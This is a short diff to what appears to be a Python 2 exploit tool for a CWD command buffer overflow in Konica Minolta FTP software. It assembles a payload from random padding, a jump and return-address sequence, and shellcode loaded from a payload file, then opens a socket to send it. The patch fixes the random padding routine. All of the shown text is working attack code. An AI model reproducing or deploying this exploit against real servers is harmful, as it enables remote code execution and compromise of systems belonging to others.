@@ -78,14 +78,16 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
     char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
     payload = ""
     for a in range(0, 1037):
-      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
+      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
+      payload += tmp.decode('string_escape')
     payload += "\xEB\x06b<\x9Dm \x12"
     f = open("../../../payloads/konica_minolta_cwd.shell", "r")
     for line in f.readlines():
       payload += line[:-1].decode('string_escape')
     f.close()
     for a in range(0, 3000):
-      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
+      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
+      payload += tmp.decode('string_escape')
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
     s = socket(AF_INET, SOCK_STREAM)
